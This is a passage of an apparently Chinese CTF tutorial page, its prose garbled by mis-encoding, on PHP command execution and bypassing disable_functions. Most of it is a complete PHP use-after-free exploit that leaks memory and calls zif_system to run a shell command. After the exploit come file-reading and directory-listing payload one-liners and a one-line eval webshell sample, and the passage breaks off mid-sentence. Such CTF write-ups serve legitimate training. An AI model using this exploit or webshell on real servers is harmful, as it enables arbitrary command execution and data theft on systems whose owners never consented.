class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡disable-function">ç»•è¿‡disable_function</h5><p><strong>é€‚ç”¨äºevalç±»å‘½ä»¤æ‰§è¡Œ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰«ææ ¹ç›®å½•æœ‰ä»€ä¹ˆæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot; &quot;</span>);&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) !=<span class="literal">false</span>)&#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot; &quot;</span>;&#125;    </span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) != <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯»å–çš„è¯ä¸€èˆ¬éƒ½æ˜¯ç”¨çš„include(),highlight_file(),show_source(),readfile(),require(),require_once()ç­‰å‡½æ•°è¿›è¡Œè¯»å–</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç»“æœè¢«æ›¿æ¢ï¼Œå¯ä»¥åœ¨ä»£ç åè¾¹åŠ ä¸€ä¸ªexité€€å‡ºï¼Œè¿›è€Œç»•è¿‡å¯¹äºç»“æœçš„æ›¿æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) != <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&quot;</span>;&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h3 id="evalç±»å‘½ä»¤æ‰§è¡Œ">evalç±»å‘½ä»¤æ‰§è¡Œ</h3><p>æ‰€è°“evalç±»å‘½ä»¤æ‰§è¡Œå³åŸé¢˜ä¸­ç»™å‡ºäº†eval()è¿™ä¸€å‡½æ•°ï¼Œå¹¶è®©å…¶å‚æ•°å¯æ§</p><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>evalå‡½æ•°çš„æœ¬è´¨æ˜¯å°†ä»»æ„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œgetå’Œpostä¼ å‚æ˜¯ä¼ 